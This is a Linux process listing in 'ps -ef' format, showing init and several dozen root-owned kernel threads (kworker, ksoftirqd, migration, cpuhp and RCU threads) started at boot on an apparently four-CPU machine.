UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 19:43 ?        00:00:01 /sbin/init splash
root           2       0  0 19:43 ?        00:00:00 [kthreadd]
root           3       2  0 19:43 ?        00:00:00 [pool_workqueue_release]
root           4       2  0 19:43 ?        00:00:00 [kworker/R-rcu_gp]
root           5       2  0 19:43 ?        00:00:00 [kworker/R-sync_wq]
root           6       2  0 19:43 ?        00:00:00 [kworker/R-kvfree_rcu_reclaim]
root           7       2  0 19:43 ?        00:00:00 [kworker/R-slub_flushwq]
root           8       2  0 19:43 ?        00:00:00 [kworker/R-netns]
root          10       2  0 19:43 ?        00:00:00 [kworker/0:1-events]
root          11       2  0 19:43 ?        00:00:00 [kworker/0:0H-events_highpri]
root          12       2  0 19:43 ?        00:00:00 [kworker/u512:0-ipv6_addrconf]
root          13       2  0 19:43 ?        00:00:00 [kworker/R-mm_percpu_wq]
root          14       2  0 19:43 ?        00:00:00 [rcu_tasks_kthread]
root          15       2  0 19:43 ?        00:00:00 [rcu_tasks_rude_kthread]
root          16       2  0 19:43 ?        00:00:00 [rcu_tasks_trace_kthread]
root          17       2  0 19:43 ?        00:00:00 [ksoftirqd/0]
root          18       2  0 19:43 ?        00:00:00 [rcu_preempt]
root          19       2  0 19:43 ?        00:00:00 [rcu_exp_par_gp_kthread_worker/1]
root          20       2  0 19:43 ?        00:00:00 [rcu_exp_gp_kthread_worker]
root          21       2  0 19:43 ?        00:00:00 [migration/0]
root          22       2  0 19:43 ?        00:00:00 [idle_inject/0]
root          23       2  0 19:43 ?        00:00:00 [cpuhp/0]
root          24       2  0 19:43 ?        00:00:00 [cpuhp/1]
root          25       2  0 19:43 ?        00:00:00 [idle_inject/1]
root          26       2  0 19:43 ?        00:00:00 [migration/1]
root          27       2  0 19:43 ?        00:00:00 [ksoftirqd/1]
root          29       2  0 19:43 ?        00:00:00 [kworker/1:0H-events_highpri]
root          30       2  0 19:43 ?        00:00:00 [cpuhp/2]
root          31       2  0 19:43 ?        00:00:00 [idle_inject/2]
root          32       2  0 19:43 ?        00:00:00 [migration/2]
root          33       2  0 19:43 ?        00:00:00 [ksoftirqd/2]
root          34       2  0 19:43 ?        00:00:00 [kworker/2:0-events]
root          35       2  0 19:43 ?        00:00:00 [kworker/2:0H-kblockd]
root          36       2  0 19:43 ?        00:00:00 [cpuhp/3]
root          37       2  0 19:43 ?        00:00:00 [idle_inject/3]
root          38       2  0 19:43 ?        00:00:00 [migration/3]
root          39       2  0 19:43 ?        00:00:00 [ksoftirqd/3]
root          40       2  0 19:43 ?        00:00:00 [kworker/3:0-cgroup_destroy]
root          41       2  0 19:43 ?        00:00:00 [kworker/3:0H-events_highpri]
root          42       2  0 19:43 ?        00:00:00 [kworker/u513:0-flush-8:0]
root          43       2  0 19:43 ?        00:00:00 [kworker/u514:0-flush-8:0]
root          44       2  0 19:43 ?        00:00:00 [kworker/u515:0-flush-8:0]
